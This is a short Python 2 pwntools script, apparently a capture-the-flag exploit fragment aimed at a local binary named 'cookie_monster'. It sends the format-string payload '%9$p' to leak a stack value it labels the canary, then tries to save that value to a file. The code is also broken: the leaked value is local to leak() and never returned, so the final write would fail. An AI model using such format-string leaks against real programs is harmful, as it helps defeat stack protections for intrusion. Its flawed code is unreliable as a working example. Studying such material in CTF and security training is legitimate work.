#!/usr/bin/python2

from pwn import *
pie = ''

def leak():
    global pie
    p = process("./cookie_monster")
    p.sendline("%9$p")
    p.recvuntil('Hello, ')
    canary = p.recvline()[:-1]
    p.close()

if __name__ == "__main__":
    leak()
    open('canary', 'w+').write(canary)